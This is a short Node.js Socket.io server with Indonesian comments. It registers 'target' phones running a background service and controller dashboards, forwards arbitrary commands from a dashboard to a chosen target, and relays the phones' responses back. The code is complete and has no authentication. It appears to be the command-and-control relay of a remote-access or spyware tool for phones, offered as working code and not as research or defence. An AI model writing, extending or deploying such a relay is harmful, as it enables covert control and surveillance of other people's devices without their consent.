const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" }
});

// Sajikan file static dashboard dari folder public
app.use(express.static(path.join(__dirname, 'public')));

// Penyimpanan sesi perangkat aktif di memori server
const activeDevices = new Map();
const activeDashboards = new Set();

io.on('connection', (socket) => {
    console.log(`[+] Koneksi masuk: ${socket.id}`);

    // 1. Registrasi dari HP Target (Background Service / Client)
    socket.on('register-device', (data) => {
        const { deviceId, deviceName } = data;
        if (!deviceId) return;

        socket.deviceId = deviceId;
        activeDevices.set(deviceId, { socketId: socket.id, deviceName: deviceName || 'Unknown Device' });
        
        console.log(`[TARGET ONLINE] ${deviceName} (${deviceId})`);
        
        // Beritahu semua dashboard bahwa perangkat ini online
        io.emit('device-list-update', Array.from(activeDevices.entries()).map(([id, val]) => ({
            deviceId: id,
            deviceName: val.deviceName,
            status: 'ONLINE'
        })));
    });

    // 2. Registrasi dari Web Dashboard Pengontrol
    socket.on('register-dashboard', () => {
        activeDashboards.add(socket.id);
        // Kirim daftar perangkat aktif saat ini ke dashboard yang baru terhubung
        socket.emit('device-list-update', Array.from(activeDevices.entries()).map(([id, val]) => ({
            deviceId: id,
            deviceName: val.deviceName,
            status: 'ONLINE'
        })));
    });

    // 3. Meneruskan Perintah dari Dashboard ke Target tertentu
    socket.on('send-command', (payload) => {
        const { targetId, action } = payload;
        const target = activeDevices.get(targetId);

        if (target) {
            io.to(target.socketId).emit('execute-command', { action });
            console.log(`[>] Perintah '${action}' dikirim ke target: ${targetId}`);
        } else {
            socket.emit('server-log', { message: `Gagal: Perangkat ${targetId} sedang offline.` });
        }
    });

    // 4. Menerima Laporan / Respon dari HP Target kembali ke Dashboard
    socket.on('device-response', (res) => {
        console.log(`[<] Respon dari ${res.deviceId}:`, res.message);
        // Broadcast respon ke seluruh dashboard yang memantau
        io.emit('broadcast-response', res);
    });

    // 5. Penanganan Diskoneksi
    socket.on('disconnect', () => {
        if (socket.deviceId) {
            console.log(`[-] Perangkat Offline: ${socket.deviceId}`);
            activeDevices.delete(socket.deviceId);
            io.emit('device-list-update', Array.from(activeDevices.entries()).map(([id, val]) => ({
                deviceId: id,
                deviceName: val.deviceName,
                status: 'ONLINE'
            })));
        }
        activeDashboards.delete(socket.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`[*] Professional Relay Server aktif di port ${PORT}`);
});
